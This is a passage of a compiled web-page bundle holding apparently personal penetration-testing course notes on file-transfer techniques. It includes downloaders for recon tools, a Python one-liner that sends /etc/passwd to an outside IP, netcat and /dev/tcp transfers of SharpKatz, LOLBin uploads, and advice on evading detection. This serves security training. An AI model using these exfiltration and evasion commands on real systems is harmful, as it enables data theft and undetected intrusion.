Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))\'\n'})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"Perl:"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'adriangalera@htb[/htb]$ perl -e \'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");\'\n'})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"Javascript (for Windows):"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-javascript",children:'var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");\nWinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject("ADODB.Stream");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n'})}),"\n",(0,l.jsxs)(n.p,{children:["Save it as ",(0,l.jsx)(n.code,{children:"wget.js"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"C:\\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"Visual Basic (VBScript)"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-vbscript",children:'dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")\ndim bStrm: Set bStrm = createobject("Adodb.Stream")\nxHttp.Open "GET", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n'})}),"\n",(0,l.jsxs)(n.p,{children:["Save it as ",(0,l.jsx)(n.code,{children:"wget.vbs"})," and use it:"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"C:\\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1\n"})}),"\n",(0,l.jsx)(n.p,{children:"We can use any programming language to perform upload operations, for example Python:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'python3 -c \'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})\'\n'})}),"\n",(0,l.jsx)(n.h2,{id:"other-transfers",children:"Other transfers"}),"\n",(0,l.jsx)(n.h3,{id:"netcat-nc",children:"Netcat (nc)"}),"\n",(0,l.jsx)(n.p,{children:"Victim machine:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"nc -l -p 8000 > SharpKatz.exe\n"})}),"\n",(0,l.jsx)(n.p,{children:"Attacker machine:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"adriangalera@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe\nadriangalera@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe\n"})}),"\n",(0,l.jsxs)(n.p,{children:["There might be variations of the commands to use depending if the binary is ",(0,l.jsx)(n.code,{children:"nc"})," or ",(0,l.jsx)(n.code,{children:"ncat"}),"."]}),"\n",(0,l.jsx)(n.p,{children:"Additionally, we can have nc + /dev/tcp combination:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe\n"})}),"\n",(0,l.jsxs)(n.p,{children:["This will download to the IP, download file and save it as ",(0,l.jsx)(n.code,{children:"SharpKatz.exe"}),"."]}),"\n",(0,l.jsx)(n.h3,{id:"winrm",children:"WinRM"}),"\n",(0,l.jsx)(n.p,{children:"WinRM is some sort of SSH for Windows."}),"\n",(0,l.jsx)(n.p,{children:"To start, confirm the connection can be executed with WinRM:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"PS C:\\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985\n\nComputerName     : DATABASE01\nRemoteAddress    : 192.168.1.101\nRemotePort       : 5985\nInterfaceAlias   : Ethernet0\nSourceAddress    : 192.168.1.100\nTcpTestSucceeded : True\n"})}),"\n",(0,l.jsx)(n.p,{children:"Now, we'll define a session variable that we can reuse:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"$Session = New-PSSession -ComputerName DATABASE01\n"})}),"\n",(0,l.jsx)(n.p,{children:"Copy from attacker to victim:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"PS C:\\htb> Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\\n"})}),"\n",(0,l.jsx)(n.p,{children:"Copy from victim to attacker:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:'PS C:\\htb> Copy-Item -Path "C:\\Users\\Administrator\\Desktop\\DATABASE.txt" -Destination C:\\ -FromSession $Session\n'})}),"\n",(0,l.jsx)(n.h3,{id:"rdp",children:"RDP"}),"\n",(0,l.jsx)(n.p,{children:"Use copy-paste in the Remote Desktop Protocol (RDP)."}),"\n",(0,l.jsx)(n.p,{children:"If copy-past do not work, we can mount a disk using RDP."}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'\nxfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer\n"})}),"\n",(0,l.jsxs)(n.p,{children:["Later, when we use the remote desktop, we can reach the shared disk in ",(0,l.jsx)(n.code,{children:"\\\\tsclient\\"}),"."]}),"\n",(0,l.jsx)(n.p,{children:"For Windows, we can use the application mstsc.exe remote desktop client."}),"\n",(0,l.jsx)(n.h2,{id:"protect-file-transfers",children:"Protect file transfers"}),"\n",(0,l.jsx)(n.p,{children:"Specially when dealing with sensitive data, it is recommended to encrypt the data before the transfer."}),"\n",(0,l.jsxs)(n.p,{children:["In Windows, we can use ",(0,l.jsx)(n.a,{href:"https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1",children:"https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1"})," to encrypt the files with AES."]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:'PS C:\\htb> Import-Module .\\Invoke-AESEncryption.ps1\nPS C:\\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\\scan-results.txt\n\nFile encrypted to C:\\htb\\scan-results.txt.aes\n'})}),"\n",(0,l.jsxs)(n.p,{children:["In Linux, we can use ",(0,l.jsx)(n.code,{children:"openssl"})," to encrypt the data:"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"adriangalera@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc\n"})}),"\n",(0,l.jsx)(n.p,{children:"and decrypt it in the other side:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"adriangalera@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    \n"})}),"\n",(0,l.jsx)(n.h2,{id:"living-off-the-land",children:"Living off the land"}),"\n",(0,l.jsx)(n.p,{children:"Some binary programs can be used to perform more tasks than intended. Some of these tasks are:"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"Download"}),"\n",(0,l.jsx)(n.li,{children:"Upload"}),"\n",(0,l.jsx)(n.li,{children:"Command Execution"}),"\n",(0,l.jsx)(n.li,{children:"File R/W"}),"\n",(0,l.jsx)(n.li,{children:"Bypass"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"We can check if the binaries we have access can be used to do download or upload operations in the following websites:"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.a,{href:"https://lolbas-project.github.io/",children:"https://lolbas-project.github.io/"})," for Windows"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.a,{href:"https://gtfobins.github.io/",children:"https://gtfobins.github.io/"})," for Linux"]}),"\n"]}),"\n",(0,l.jsxs)(n.p,{children:["For example, we can use ",(0,l.jsx)(n.code,{children:"certreq.exe"})," to upload files:"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"C:\\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\\windows\\win.ini\nCertificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)\n"})}),"\n",(0,l.jsxs)(n.p,{children:["Or another example, we can use ",(0,l.jsx)(n.code,{children:"openssl"})," to serve files:"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\nopenssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh\n"})}),"\n",(0,l.jsx)(n.p,{children:"And download it in the other side:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh\n"})}),"\n",(0,l.jsx)(n.h2,{id:"detection",children:"Detection"}),"\n",(0,l.jsxs)(n.p,{children:["Usually there are mechanism to prevent this kind of file transfer. Most common tools to perform file transfer reveals known ",(0,l.jsx)(n.code,{children:"User-Agents"}),"."]}),"\n",(0,l.jsx)(n.p,{children:"In order to avoid detection, a good idea might be to change the user agent of the tool used (if possible)."}),"\n",(0,l.jsx)(n.p,{children:"Additionally, the mere execution of a blacklisted binary, might trigger some alarms."}),"\n",(0,l.jsx)(n.p,{children:"We can use GTFOBins or LOLBas to find binaries that will do the thing we need and are not blacklisted."})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(c,{...e})}):c(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>a});var t=s(6540);const l={},r=t.createContext(l);function i(e){const n=t.useContext(r);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:i(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);